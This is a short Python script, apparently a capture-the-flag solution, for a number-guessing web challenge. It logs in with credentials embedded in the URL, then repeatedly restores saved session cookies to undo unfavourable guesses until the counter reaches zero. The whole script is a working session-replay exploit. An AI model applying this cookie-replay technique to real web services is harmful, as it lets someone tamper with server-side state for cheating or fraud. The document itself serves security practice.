from requests import Session


def guess(num):
    answer = s.get(url.format(f"play/{num}"))
    answer = answer.text.split()
    if answer[4].isnumeric():
        return int(answer[4])
    else:
        print(answer[-1])

url = "https://stateful:re1eNaivee@stateful.031337.xyz/{}"
s = Session()
s.get(url.format("start"))
cookies = s.cookies.copy()
g = 42
while g != 0:
    for num in range(13, 38):
        s.cookies.update(cookies)
        to_go = guess(num)
        if to_go < g:
            cookies = s.cookies.copy()
            g = to_go
            print(g)
